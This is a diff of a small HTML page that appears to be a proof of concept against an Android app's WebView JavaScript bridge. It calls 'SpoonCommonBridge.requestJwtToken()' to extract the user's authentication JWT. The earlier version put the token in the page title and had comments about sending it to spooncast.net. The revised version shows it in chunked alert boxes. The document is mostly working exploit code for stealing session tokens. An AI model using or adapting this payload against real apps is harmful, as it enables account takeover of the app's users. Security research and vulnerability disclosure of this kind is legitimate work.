@@ -1,23 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><title>EVT</title><meta name="viewport" content="width=device-width,initial-scale=1"></head>
-<body style="background:#000;color:#0f0;font-size:16px;padding:10px;font-family:monospace;">
-<div id="out"></div>
+<head><title>Event</title></head>
+<body style="background:#fff;color:#000;">
 <script>
-var out = document.getElementById("out");
 try {
   var jwt = window.SpoonCommonBridge.requestJwtToken();
   if (jwt) {
-    // Put JWT in document title - visible via dumpsys
-    document.title = "JWT:" + jwt;
-    out.textContent = "JWT captured in title. Len=" + jwt.length;
-    // Also try to send via Image to spooncast.net (cleartext allowed)
-    // This will be intercepted by shouldOverrideUrlLoading but the request itself hits the network
+    // Split into 3 alerts for readability
+    var chunkSize = Math.ceil(jwt.length / 3);
+    for (var i = 0; i < 3; i++) {
+      var chunk = jwt.substring(i * chunkSize, (i + 1) * chunkSize);
+      alert("JWT" + (i+1) + ":" + chunk);
+    }
   } else {
-    out.textContent = "NO JWT";
+    alert("NO_JWT");
   }
 } catch(e) {
-  out.textContent = "ERR: " + e.message;
+  alert("ERR:" + e.message);
 }
 </script>
 </body>
